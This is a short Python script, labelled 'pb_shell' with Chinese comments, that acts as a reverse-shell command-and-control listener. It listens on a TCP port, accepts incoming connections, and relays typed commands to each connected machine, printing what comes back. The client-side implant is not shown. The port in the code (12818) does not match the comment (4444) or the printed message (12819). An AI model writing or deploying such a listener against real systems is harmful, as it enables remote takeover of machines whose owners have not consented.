import socket
import subprocess
import threading

def handle_client(client_socket):
    while True:
        try:
            command = input("Enter command: ")
            if command.lower() == 'exit':
                break
            elif command == '818':  # 当输入818时，服务器停止运行
                print("\n服务器正在关闭...")
                client_socket.close()
                return
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except Exception as e:
            print(f"Error: {e}")
            break
    client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 12818))  # 监听所有可用的网络接口，端口4444
    server.listen(5)
    print("欢迎使用pb_shell")
    print("正在监听12819端口")
    
    while True:
        client, addr = server.accept()
        print(f"已连接到{addr}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\n服务器正在关闭...")